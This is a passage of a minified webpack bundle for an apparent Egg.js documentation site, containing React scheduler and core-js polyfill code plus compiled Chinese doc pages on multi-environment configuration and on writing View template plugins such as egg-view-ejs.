https://fb.me/react-polyfills")}if("object"===typeof m&&"function"===typeof m.now)t.unstable_now=function(){return m.now()};else{var E=p.now();t.unstable_now=function(){return p.now()-E}}var b=!1,v=null,y=-1,k=5,w=0;o=function(){return t.unstable_now()>=w},i=function(){},t.unstable_forceFrameRate=function(e){0>e||125<e?console.error("forceFrameRate takes a positive int between 0 and 125, forcing framerates higher than 125 fps is not unsupported"):k=0<e?Math.floor(1e3/e):5};var x=new MessageChannel,j=x.port2;x.port1.onmessage=function(){if(null!==v){var e=t.unstable_now();w=e+k;try{v(!0,e)?j.postMessage(null):(b=!1,v=null)}catch(n){throw j.postMessage(null),n}}else b=!1},a=function(e){v=e,b||(b=!0,j.postMessage(null))},r=function(e,n){y=h((function(){e(t.unstable_now())}),n)},l=function(){g(y),y=-1}}function S(e,t){var n=e.length;e.push(t);e:for(;;){var a=n-1>>>1,r=e[a];if(!(void 0!==r&&0<L(r,t)))break e;e[a]=t,e[n]=r,n=a}}function C(e){return e=e[0],void 0===e?null:e}function A(e){var t=e[0];if(void 0!==t){var n=e.pop();if(n!==t){e[0]=n;e:for(var a=0,r=e.length;a<r;){var l=2*(a+1)-1,o=e[l],i=l+1,c=e[i];if(void 0!==o&&0>L(o,n))void 0!==c&&0>L(c,o)?(e[a]=c,e[i]=n,a=i):(e[a]=o,e[l]=n,a=l);else{if(!(void 0!==c&&0>L(c,n)))break e;e[a]=c,e[i]=n,a=i}}}return t}return null}function L(e,t){var n=e.sortIndex-t.sortIndex;return 0!==n?n:e.id-t.id}var T=[],N=[],O=1,I=null,P=3,R=!1,_=!1,q=!1;function M(e){for(var t=C(N);null!==t;){if(null===t.callback)A(N);else{if(!(t.startTime<=e))break;A(N),t.sortIndex=t.expirationTime,S(T,t)}t=C(N)}}function F(e){if(q=!1,M(e),!_)if(null!==C(T))_=!0,a(D);else{var t=C(N);null!==t&&r(F,t.startTime-e)}}function D(e,n){_=!1,q&&(q=!1,l()),R=!0;var a=P;try{for(M(n),I=C(T);null!==I&&(!(I.expirationTime>n)||e&&!o());){var i=I.callback;if(null!==i){I.callback=null,P=I.priorityLevel;var c=i(I.expirationTime<=n);n=t.unstable_now(),"function"===typeof c?I.callback=c:I===C(T)&&A(T),M(n)}else A(T);I=C(T)}if(null!==I)var s=!0;else{var u=C(N);null!==u&&r(F,u.startTime-n),s=!1}return s}finally{I=null,P=a,R=!1}}function U(e){switch(e){case 1:return-1;case 2:return 250;case 5:return 1073741823;case 4:return 1e4;default:return 5e3}}var z=i;t.unstable_IdlePriority=5,t.unstable_ImmediatePriority=1,t.unstable_LowPriority=4,t.unstable_NormalPriority=3,t.unstable_Profiling=null,t.unstable_UserBlockingPriority=2,t.unstable_cancelCallback=function(e){e.callback=null},t.unstable_continueExecution=function(){_||R||(_=!0,a(D))},t.unstable_getCurrentPriorityLevel=function(){return P},t.unstable_getFirstCallbackNode=function(){return C(T)},t.unstable_next=function(e){switch(P){case 1:case 2:case 3:var t=3;break;default:t=P}var n=P;P=t;try{return e()}finally{P=n}},t.unstable_pauseExecution=function(){},t.unstable_requestPaint=z,t.unstable_runWithPriority=function(e,t){switch(e){case 1:case 2:case 3:case 4:case 5:break;default:e=3}var n=P;P=e;try{return t()}finally{P=n}},t.unstable_scheduleCallback=function(e,n,o){var i=t.unstable_now();if("object"===typeof o&&null!==o){var c=o.delay;c="number"===typeof c&&0<c?i+c:i,o="number"===typeof o.timeout?o.timeout:U(e)}else o=U(e),c=i;return o=c+o,e={id:O++,callback:n,priorityLevel:e,startTime:c,expirationTime:o,sortIndex:-1},c>i?(e.sortIndex=c,S(N,e),null===C(T)&&e===C(N)&&(q?l():q=!0,r(F,c-i))):(e.sortIndex=o,S(T,e),_||R||(_=!0,a(D))),e},t.unstable_shouldYield=function(){var e=t.unstable_now();M(e);var n=C(T);return n!==I&&null!==I&&null!==n&&null!==n.callback&&n.startTime<=e&&n.expirationTime<I.expirationTime||o()},t.unstable_wrapCallback=function(e){var t=P;return function(){var n=P;P=t;try{return e.apply(this,arguments)}finally{P=n}}}},rV3k:function(e,t){e.exports="undefined"!==typeof ArrayBuffer&&"undefined"!==typeof DataView},ra1n:function(e,t,n){"use strict";n("S/RT");var a=n("AzF/"),r=n("Xdqv"),l=n("q7Pv"),o=n("KeQb"),i=n("XExY"),c=l("species"),s=!r((function(){var e=/./;return e.exec=function(){var e=[];return e.groups={a:"7"},e},"7"!=="".replace(e,"$<a>")})),u=function(){return"$0"==="a".replace(/./,"$0")}(),d=l("replace"),m=function(){return!!/./[d]&&""===/./[d]("a","$0")}(),p=!r((function(){var e=/(?:)/,t=e.exec;e.exec=function(){return t.apply(this,arguments)};var n="ab".split(e);return 2!==n.length||"a"!==n[0]||"b"!==n[1]}));e.exports=function(e,t,n,d){var h=l(e),g=!r((function(){var t={};return t[h]=function(){return 7},7!=""[e](t)})),f=g&&!r((function(){var t=!1,n=/a/;return"split"===e&&(n={},n.constructor={},n.constructor[c]=function(){return n},n.flags="",n[h]=/./[h]),n.exec=function(){return t=!0,null},n[h](""),!t}));if(!g||!f||"replace"===e&&(!s||!u||m)||"split"===e&&!p){var E=/./[h],b=n(h,""[e],(function(e,t,n,a,r){return t.exec===o?g&&!r?{done:!0,value:E.call(t,n,a)}:{done:!0,value:e.call(n,t,a)}:{done:!1}}),{REPLACE_KEEPS_$0:u,REGEXP_REPLACE_SUBSTITUTES_UNDEFINED_CAPTURE:m}),v=b[0],y=b[1];a(String.prototype,e,v),a(RegExp.prototype,h,2==t?function(e,t){return y.call(e,this,t)}:function(e){return y.call(e,this)})}d&&i(RegExp.prototype[h],"sham",!0)}},rdCR:function(e,t,n){var a=n("q7Pv"),r=a("toStringTag"),l={};l[r]="z",e.exports="[object z]"===String(l)},rfUw:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=n("3dEy"),c=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86\u5f3a\u5927\u4e14\u53ef\u6269\u5c55\u7684\u914d\u7f6e\u529f\u80fd\uff0c\u53ef\u4ee5\u81ea\u52a8\u5408\u5e76\u5e94\u7528\u3001\u63d2\u4ef6\u3001\u6846\u67b6\u7684\u914d\u7f6e\uff0c\u6309\u987a\u5e8f\u8986\u76d6\uff0c\u4e14\u53ef\u4ee5\u6839\u636e\u73af\u5883\u7ef4\u62a4\u4e0d\u540c\u7684\u914d\u7f6e\u3002\u5408\u5e76\u540e\u7684\u914d\u7f6e\u53ef\u76f4\u63a5\u4ece ",r.a.createElement("code",null,"app.config")," \u83b7\u53d6\u3002"),r.a.createElement("p",null,"\u914d\u7f6e\u7684\u7ba1\u7406\u6709\u591a\u79cd\u65b9\u6848\uff0c\u4ee5\u4e0b\u5217\u4e00\u4e9b\u5e38\u89c1\u7684\u65b9\u6848"),r.a.createElement("ol",null,r.a.createElement("li",null,"\u4f7f\u7528\u5e73\u53f0\u7ba1\u7406\u914d\u7f6e\uff0c\u5e94\u7528\u6784\u5efa\u65f6\u5c06\u5f53\u524d\u73af\u5883\u7684\u914d\u7f6e\u653e\u5165\u5305\u5185\uff0c\u542f\u52a8\u65f6\u6307\u5b9a\u8be5\u914d\u7f6e\u3002\u4f46\u5e94\u7528\u5c31\u65e0\u6cd5\u4e00\u6b21\u6784\u5efa\u591a\u6b21\u90e8\u7f72\uff0c\u800c\u4e14\u672c\u5730\u5f00\u53d1\u73af\u5883\u60f3\u4f7f\u7528\u914d\u7f6e\u4f1a\u53d8\u7684\u5f88\u9ebb\u70e6\u3002"),r.a.createElement("li",null,"\u4f7f\u7528\u5e73\u53f0\u7ba1\u7406\u914d\u7f6e\uff0c\u5728\u542f\u52a8\u65f6\u5c06\u5f53\u524d\u73af\u5883\u7684\u914d\u7f6e\u901a\u8fc7\u73af\u5883\u53d8\u91cf\u4f20\u5165\uff0c\u8fd9\u662f\u6bd4\u8f83\u4f18\u96c5\u7684\u65b9\u5f0f\uff0c\u4f46\u6846\u67b6\u5bf9\u8fd0\u7ef4\u7684\u8981\u6c42\u4f1a\u6bd4\u8f83\u9ad8\uff0c\u9700\u8981\u90e8\u7f72\u5e73\u53f0\u652f\u6301\uff0c\u540c\u65f6\u5f00\u53d1\u73af\u5883\u4e5f\u6709\u76f8\u540c\u75db\u70b9\u3002"),r.a.createElement("li",null,"\u4f7f\u7528\u4ee3\u7801\u7ba1\u7406\u914d\u7f6e\uff0c\u5728\u4ee3\u7801\u4e2d\u6dfb\u52a0\u591a\u4e2a\u73af\u5883\u7684\u914d\u7f6e\uff0c\u5728\u542f\u52a8\u65f6\u4f20\u5165\u5f53\u524d\u73af\u5883\u7684\u53c2\u6570\u5373\u53ef\u3002\u4f46\u65e0\u6cd5\u5168\u5c40\u914d\u7f6e\uff0c\u5fc5\u987b\u4fee\u6539\u4ee3\u7801\u3002")),r.a.createElement("p",null,"\u6211\u4eec\u9009\u62e9\u4e86\u6700\u540e\u4e00\u79cd\u914d\u7f6e\u65b9\u6848\uff0c",r.a.createElement("strong",null,"\u914d\u7f6e\u5373\u4ee3\u7801"),"\uff0c\u914d\u7f6e\u7684\u53d8\u66f4\u4e5f\u5e94\u8be5\u7ecf\u8fc7 review \u540e\u624d\u80fd\u53d1\u5e03\u3002\u5e94\u7528\u5305\u672c\u8eab\u662f\u53ef\u4ee5\u90e8\u7f72\u5728\u591a\u4e2a\u73af\u5883\u7684\uff0c\u53ea\u9700\u8981\u6307\u5b9a\u8fd0\u884c\u73af\u5883\u5373\u53ef\u3002"),r.a.createElement("h3",{id:"\u591a\u73af\u5883\u914d\u7f6e"},r.a.createElement(l["AnchorLink"],{to:"#\u591a\u73af\u5883\u914d\u7f6e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u591a\u73af\u5883\u914d\u7f6e"),r.a.createElement("p",null,"\u6846\u67b6\u652f\u6301\u6839\u636e\u73af\u5883\u6765\u52a0\u8f7d\u914d\u7f6e\uff0c\u5b9a\u4e49\u591a\u4e2a\u73af\u5883\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5177\u4f53\u73af\u5883\u8bf7\u67e5\u770b",r.a.createElement(l["Link"],{to:"./env"},"\u8fd0\u884c\u73af\u5883\u914d\u7f6e")),r.a.createElement(o["a"],{code:"config\n|- config.default.js\n|- config.prod.js\n|- config.unittest.js\n`- config.local.js",lang:"unknown"}),r.a.createElement("p",null,r.a.createElement("code",null,"config.default.js")," \u4e3a\u9ed8\u8ba4\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u6240\u6709\u73af\u5883\u90fd\u4f1a\u52a0\u8f7d\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\uff0c\u4e00\u822c\u4e5f\u4f1a\u4f5c\u4e3a\u5f00\u53d1\u73af\u5883\u7684\u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\u3002"),r.a.createElement("p",null,"\u5f53\u6307\u5b9a env \u65f6\u4f1a\u540c\u65f6\u52a0\u8f7d\u9ed8\u8ba4\u914d\u7f6e\u548c\u5bf9\u5e94\u7684\u914d\u7f6e(\u5177\u540d\u914d\u7f6e)\u6587\u4ef6\uff0c\u5177\u540d\u914d\u7f6e\u548c\u9ed8\u8ba4\u914d\u7f6e\u5c06\u5408\u5e76(\u4f7f\u7528",r.a.createElement(l["Link"],{to:"https://www.npmjs.com/package/extend2"},"extend2"),"\u6df1\u62f7\u8d1d)\u6210\u6700\u7ec8\u914d\u7f6e\uff0c\u5177\u540d\u914d\u7f6e\u9879\u4f1a\u8986\u76d6\u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\u7684\u540c\u540d\u914d\u7f6e\u3002\u5982 ",r.a.createElement("code",null,"prod")," \u73af\u5883\u4f1a\u52a0\u8f7d ",r.a.createElement("code",null,"config.prod.js")," \u548c ",r.a.createElement("code",null,"config.default.js")," \u6587\u4ef6\uff0c",r.a.createElement("code",null,"config.prod.js")," \u4f1a\u8986\u76d6 ",r.a.createElement("code",null,"config.default.js")," \u7684\u540c\u540d\u914d\u7f6e\u3002"),r.a.createElement("h3",{id:"\u914d\u7f6e\u5199\u6cd5"},r.a.createElement(l["AnchorLink"],{to:"#\u914d\u7f6e\u5199\u6cd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u914d\u7f6e\u5199\u6cd5"),r.a.createElement("p",null,"\u914d\u7f6e\u6587\u4ef6\u8fd4\u56de\u7684\u662f\u4e00\u4e2a object \u5bf9\u8c61\uff0c\u53ef\u4ee5\u8986\u76d6\u6846\u67b6\u7684\u4e00\u4e9b\u914d\u7f6e\uff0c\u5e94\u7528\u4e5f\u53ef\u4ee5\u5c06\u81ea\u5df1\u4e1a\u52a1\u7684\u914d\u7f6e\u653e\u5230\u8fd9\u91cc\u65b9\u4fbf\u7ba1\u7406\u3002"),r.a.createElement(o["a"],{code:"// \u914d\u7f6e logger \u6587\u4ef6\u7684\u76ee\u5f55\uff0clogger \u9ed8\u8ba4\u914d\u7f6e\u7531\u6846\u67b6\u63d0\u4f9b\nmodule.exports = {\n  logger: {\n    dir: '/home/admin/logs/demoapp',\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u914d\u7f6e\u6587\u4ef6\u4e5f\u53ef\u4ee5\u7b80\u5316\u7684\u5199\u6210 ",r.a.createElement("code",null,"exports.key = value")," \u5f62\u5f0f"),r.a.createElement(o["a"],{code:"exports.keys = 'my-cookie-secret-key';\nexports.logger = {\n  level: 'DEBUG',\n};",lang:"js"}),r.a.createElement("p",null,"\u914d\u7f6e\u6587\u4ef6\u4e5f\u53ef\u4ee5\u8fd4\u56de\u4e00\u4e2a function\uff0c\u53ef\u4ee5\u63a5\u53d7 appInfo \u53c2\u6570"),r.a.createElement(o["a"],{code:"// \u5c06 logger \u76ee\u5f55\u653e\u5230\u4ee3\u7801\u76ee\u5f55\u4e0b\nconst path = require('path');\nmodule.exports = (appInfo) => {\n  return {\n    logger: {\n      dir: path.join(appInfo.baseDir, 'logs'),\n    },\n  };\n};",lang:"js"}),r.a.createElement("p",null,"\u5185\u7f6e\u7684 appInfo \u6709"),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"appInfo"),r.a.createElement("th",null,"\u8bf4\u660e"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null,"pkg"),r.a.createElement("td",null,"package.json")),r.a.createElement("tr",null,r.a.createElement("td",null,"name"),r.a.createElement("td",null,"\u5e94\u7528\u540d\uff0c\u540c pkg.name")),r.a.createElement("tr",null,r.a.createElement("td",null,"baseDir"),r.a.createElement("td",null,"\u5e94\u7528\u4ee3\u7801\u7684\u76ee\u5f55")),r.a.createElement("tr",null,r.a.createElement("td",null,"HOME"),r.a.createElement("td",null,"\u7528\u6237\u76ee\u5f55\uff0c\u5982 admin \u8d26\u6237\u4e3a /home/admin")),r.a.createElement("tr",null,r.a.createElement("td",null,"root"),r.a.createElement("td",null,"\u5e94\u7528\u6839\u76ee\u5f55\uff0c\u53ea\u6709\u5728 local \u548c unittest \u73af\u5883\u4e0b\u4e3a baseDir\uff0c\u5176\u4ed6\u90fd\u4e3a HOME\u3002")))),r.a.createElement("p",null,r.a.createElement("code",null,"appInfo.root")," \u662f\u4e00\u4e2a\u4f18\u96c5\u7684\u9002\u914d\uff0c\u6bd4\u5982\u5728\u670d\u52a1\u5668\u73af\u5883\u6211\u4eec\u4f1a\u4f7f\u7528 ",r.a.createElement("code",null,"/home/admin/logs")," \u4f5c\u4e3a\u65e5\u5fd7\u76ee\u5f55\uff0c\u800c\u672c\u5730\u5f00\u53d1\u65f6\u53c8\u4e0d\u60f3\u6c61\u67d3\u7528\u6237\u76ee\u5f55\uff0c\u8fd9\u6837\u7684\u9002\u914d\u5c31\u5f88\u597d\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002"),r.a.createElement("p",null,"\u8bf7\u6839\u636e\u5177\u4f53\u573a\u5408\u9009\u62e9\u5408\u9002\u7684\u5199\u6cd5\uff0c\u4f46\u8bf7\u786e\u4fdd\u6ca1\u6709\u5199\u51fa\u4ee5\u4e0b\u4ee3\u7801\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.someKeys = 'abc';\nmodule.exports = (appInfo) => {\n  const config = {};\n  config.keys = '123456';\n  return config;\n};",lang:"js"}),r.a.createElement("h3",{id:"\u914d\u7f6e\u52a0\u8f7d\u987a\u5e8f"},r.a.createElement(l["AnchorLink"],{to:"#\u914d\u7f6e\u52a0\u8f7d\u987a\u5e8f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u914d\u7f6e\u52a0\u8f7d\u987a\u5e8f"),r.a.createElement("p",null,"\u5e94\u7528\u3001\u63d2\u4ef6\u3001\u6846\u67b6\u90fd\u53ef\u4ee5\u5b9a\u4e49\u8fd9\u4e9b\u914d\u7f6e\uff0c\u800c\u4e14\u76ee\u5f55\u7ed3\u6784\u90fd\u662f\u4e00\u81f4\u7684\uff0c\u4f46\u5b58\u5728\u4f18\u5148\u7ea7\uff08\u5e94\u7528 > \u6846\u67b6 > \u63d2\u4ef6\uff09\uff0c\u76f8\u5bf9\u4e8e\u6b64\u8fd0\u884c\u73af\u5883\u7684\u4f18\u5148\u7ea7\u4f1a\u66f4\u9ad8\u3002"),r.a.createElement("p",null,"\u6bd4\u5982\u5728 prod \u73af\u5883\u52a0\u8f7d\u4e00\u4e2a\u914d\u7f6e\u7684\u52a0\u8f7d\u987a\u5e8f\u5982\u4e0b\uff0c\u540e\u52a0\u8f7d\u7684\u4f1a\u8986\u76d6\u524d\u9762\u7684\u540c\u540d\u914d\u7f6e\u3002"),r.a.createElement(o["a"],{code:"-> \u63d2\u4ef6 config.default.js\n-> \u6846\u67b6 config.default.js\n-> \u5e94\u7528 config.default.js\n-> \u63d2\u4ef6 config.prod.js\n-> \u6846\u67b6 config.prod.js\n-> \u5e94\u7528 config.prod.js",lang:"unknown"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u63d2\u4ef6\u4e4b\u95f4\u4e5f\u4f1a\u6709\u52a0\u8f7d\u987a\u5e8f\uff0c\u4f46\u5927\u81f4\u987a\u5e8f\u7c7b\u4f3c\uff0c\u5177\u4f53\u903b\u8f91\u53ef",r.a.createElement(l["Link"],{to:"../advanced/loader"},"\u67e5\u770b\u52a0\u8f7d\u5668"),"\u3002")),r.a.createElement("h3",{id:"\u5408\u5e76\u89c4\u5219"},r.a.createElement(l["AnchorLink"],{to:"#\u5408\u5e76\u89c4\u5219","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5408\u5e76\u89c4\u5219"),r.a.createElement("p",null,"\u914d\u7f6e\u7684\u5408\u5e76\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/extend2"},"extend2")," \u6a21\u5757\u8fdb\u884c\u6df1\u5ea6\u62f7\u8d1d\uff0c",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/extend2"},"extend2")," fork \u81ea ",r.a.createElement(l["Link"],{to:"https://github.com/justmoon/node-extend"},"extend"),"\uff0c\u5904\u7406\u6570\u7ec4\u65f6\u4f1a\u5b58\u5728\u5dee\u5f02\u3002"),r.a.createElement(o["a"],{code:"const a = {\n  arr: [1, 2],\n};\nconst b = {\n  arr: [3],\n};\nextend(true, a, b);\n// => { arr: [ 3 ] }",lang:"js"}),r.a.createElement("p",null,"\u6839\u636e\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u6846\u67b6\u76f4\u63a5\u8986\u76d6\u6570\u7ec4\u800c\u4e0d\u662f\u8fdb\u884c\u5408\u5e76\u3002"),r.a.createElement("h3",{id:"\u914d\u7f6e\u7ed3\u679c"},r.a.createElement(l["AnchorLink"],{to:"#\u914d\u7f6e\u7ed3\u679c","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u914d\u7f6e\u7ed3\u679c"),r.a.createElement("p",null,"\u6846\u67b6\u5728\u542f\u52a8\u65f6\u4f1a\u628a\u5408\u5e76\u540e\u7684\u6700\u7ec8\u914d\u7f6e dump \u5230 ",r.a.createElement("code",null,"run/application_config.json"),"\uff08worker \u8fdb\u7a0b\uff09\u548c ",r.a.createElement("code",null,"run/agent_config.json"),"\uff08agent \u8fdb\u7a0b\uff09\u4e2d\uff0c\u53ef\u4ee5\u7528\u6765\u5206\u6790\u95ee\u9898\u3002"),r.a.createElement("p",null,"\u914d\u7f6e\u6587\u4ef6\u4e2d\u4f1a\u9690\u85cf\u4e00\u4e9b\u5b57\u6bb5\uff0c\u4e3b\u8981\u5305\u62ec\u4e24\u7c7b:"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5982\u5bc6\u7801\u3001\u5bc6\u94a5\u7b49\u5b89\u5168\u5b57\u6bb5\uff0c\u8fd9\u91cc\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"config.dump.ignore")," \u914d\u7f6e\uff0c\u5fc5\u987b\u662f ",r.a.createElement(l["Link"],{to:"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set"},"Set")," \u7c7b\u578b\uff0c\u67e5\u770b",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/blob/master/config/config.default.js"},"\u9ed8\u8ba4\u914d\u7f6e"),"\u3002"),r.a.createElement("li",null,"\u5982\u51fd\u6570\u3001Buffer \u7b49\u7c7b\u578b\uff0c",r.a.createElement("code",null,"JSON.stringify")," \u540e\u7684\u5185\u5bb9\u7279\u522b\u5927")),r.a.createElement("p",null,"\u8fd8\u4f1a\u751f\u6210 ",r.a.createElement("code",null,"run/application_config_meta.json"),"\uff08worker \u8fdb\u7a0b\uff09\u548c ",r.a.createElement("code",null,"run/agent_config_meta.json"),"\uff08agent \u8fdb\u7a0b\uff09\u6587\u4ef6\uff0c\u7528\u6765\u6392\u67e5\u5c5e\u6027\u7684\u6765\u6e90\uff0c\u5982"),r.a.createElement(o["a"],{code:'{\n  "logger": {\n    "dir": "/path/to/config/config.default.js"\n  }\n}',lang:"json"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(c,{demos:n})}},riNG:function(e,t,n){"use strict";var a=n("MAgz").exportTypedArrayMethod,r=n("Xdqv"),l=n("A0UU"),o=l.Uint8Array,i=o&&o.prototype||{},c=[].toString,s=[].join;r((function(){c.call({})}))&&(c=function(){return s.call(this)});var u=i.toString!=c;a("toString",c,u)},rix1:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u7edd\u5927\u591a\u6570\u60c5\u51b5\uff0c\u6211\u4eec\u90fd\u9700\u8981\u8bfb\u53d6\u6570\u636e\u540e\u6e32\u67d3\u6a21\u677f\uff0c\u7136\u540e\u5448\u73b0\u7ed9\u7528\u6237\uff0c\u800c\u6846\u67b6\u5e76\u4e0d\u5f3a\u5236\u4f7f\u7528\u67d0\u79cd\u6a21\u677f\u5f15\u64ce\uff0c\u7531\u5f00\u53d1\u8005\u6765\u81ea\u884c\u9009\u578b\uff0c\u5177\u4f53\u53c2\u89c1",r.a.createElement(l["Link"],{to:"../core/view"},"\u6a21\u677f\u6e32\u67d3"),"\u3002"),r.a.createElement("p",null,"\u672c\u6587\u5c06\u9610\u8ff0\u6846\u67b6\u5bf9 View \u63d2\u4ef6\u7684\u89c4\u8303\u7ea6\u675f, \u6211\u4eec\u53ef\u4ee5\u4f9d\u6b64\u6765\u5c01\u88c5\u5bf9\u5e94\u7684\u6a21\u677f\u5f15\u64ce\u63d2\u4ef6\u3002\u4ee5\u4e0b\u4ee5 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-ejs"},"egg-view-ejs")," \u4e3a\u4f8b\u3002"),r.a.createElement("h2",{id:"\u63d2\u4ef6\u76ee\u5f55\u7ed3\u6784"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6\u76ee\u5f55\u7ed3\u6784","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6\u76ee\u5f55\u7ed3\u6784"),r.a.createElement(o["a"],{code:"egg-view-ejs\n\u251c\u2500\u2500 config\n\u2502   \u251c\u2500\u2500 config.default.js\n\u2502   \u2514\u2500\u2500 config.local.js\n\u251c\u2500\u2500 lib\n\u2502   \u2514\u2500\u2500 view.js\n\u251c\u2500\u2500 app.js\n\u251c\u2500\u2500 test\n\u251c\u2500\u2500 History.md\n\u251c\u2500\u2500 README.md\n\u2514\u2500\u2500 package.json",lang:"bash"}),r.a.createElement("h2",{id:"\u63d2\u4ef6\u547d\u540d\u89c4\u8303"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6\u547d\u540d\u89c4\u8303","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6\u547d\u540d\u89c4\u8303"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,"\u9075\u5faa",r.a.createElement(l["Link"],{to:"./plugin"},"\u63d2\u4ef6\u5f00\u53d1\u89c4\u8303"))),r.a.createElement("li",null,r.a.createElement("p",null,"\u63d2\u4ef6\u547d\u540d\u7ea6\u5b9a\u4ee5 ",r.a.createElement("code",null,"egg-view-")," \u5f00\u5934")),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"package.json")," \u914d\u7f6e\u5982\u4e0b\uff0c\u63d2\u4ef6\u540d\u4ee5\u6a21\u677f\u5f15\u64ce\u547d\u540d\uff0c\u6bd4\u5982 ejs"),r.a.createElement(o["a"],{code:'{\n  "name": "egg-view-ejs",\n  "eggPlugin": {\n    "name": "ejs"\n  },\n  "keywords": ["egg", "egg-plugin", "egg-view", "ejs"]\n}',lang:"json"})),r.a.createElement("li",null,r.a.createElement("p",null,"\u914d\u7f6e\u9879\u4e5f\u4ee5\u6a21\u677f\u5f15\u64ce\u547d\u540d"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  ejs: {},\n};",lang:"js"}))),r.a.createElement("h2",{id:"view-\u57fa\u7c7b"},r.a.createElement(l["AnchorLink"],{to:"#view-\u57fa\u7c7b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"View \u57fa\u7c7b"),r.a.createElement("p",null,"\u63a5\u4e0b\u6765\u9700\u63d0\u4f9b\u4e00\u4e2a View \u57fa\u7c7b\uff0c\u8fd9\u4e2a\u7c7b\u4f1a\u5728\u6bcf\u6b21\u8bf7\u6c42\u5b9e\u4f8b\u5316\u3002"),r.a.createElement("p",null,"View \u57fa\u7c7b\u9700\u63d0\u4f9b ",r.a.createElement("code",null,"render")," \u548c ",r.a.createElement("code",null,"renderString")," \u4e24\u4e2a\u65b9\u6cd5\uff0c\u652f\u6301 generator function \u548c async function\uff08\u4e5f\u53ef\u4ee5\u662f\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a Promise\uff09\u3002",r.a.createElement("code",null,"render")," \u65b9\u6cd5\u7528\u4e8e\u6e32\u67d3\u6587\u4ef6\uff0c\u800c ",r.a.createElement("code",null,"renderString")," \u65b9\u6cd5\u7528\u4e8e\u6e32\u67d3\u6a21\u677f\u5b57\u7b26\u4e32\u3002"),r.a.createElement("p",null,"\u4ee5\u4e0b\u4e3a\u7b80\u5316\u4ee3\u7801\uff0c\u53ef\u76f4\u63a5",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-ejs/blob/master/lib/view.js"},"\u67e5\u770b\u6e90\u7801")),r.a.createElement(o["a"],{code:"const ejs = require('ejs');\n\nmodule.exports = class EjsView {\n  render(filename, locals) {\n    return new Promise((resolve, reject) => {\n      // \u5f02\u6b65\u8c03\u7528 API\n      ejs.renderFile(filename, locals, (err, result) => {\n        if (err) {\n          reject(err);\n        } else {\n          resolve(result);\n        }\n      });\n    });\n  }\n\n  renderString(tpl, locals) {\n    try {\n      // \u540c\u6b65\u8c03\u7528 API\n      return Promise.resolve(ejs.render(tpl, locals));\n    } catch (err) {\n      return Promise.reject(err);\n    }\n  }\n};",lang:"js"}),r.a.createElement("h3",{id:"\u53c2\u6570"},r.a.createElement(l["AnchorLink"],{to:"#\u53c2\u6570","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u53c2\u6570"),r.a.createElement("p",null,r.a.createElement("code",null,"render")," \u65b9\u6cd5\u7684\u4e09\u4e2a\u53c2\u6570"),r.a.createElement("ul",null,r.a.createElement("li",null,"filename: \u662f\u5b8c\u6574\u7684\u6587\u4ef6\u7684\u8def\u5f84\uff0c\u6846\u67b6\u67e5\u627e\u6587\u4ef6\u65f6\u5df2\u786e\u8ba4\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c\u8fd9\u91cc\u4e0d\u9700\u8981\u5904\u7406"),r.a.createElement("li",null,"locals: \u6e32\u67d3\u6240\u9700\u7684\u6570\u636e\uff0c\u6570\u636e\u6765\u81ea ",r.a.createElement("code",null,"app.locals"),"\uff0c",r.a.createElement("code",null,"ctx.locals")," \u548c\u8c03\u7528 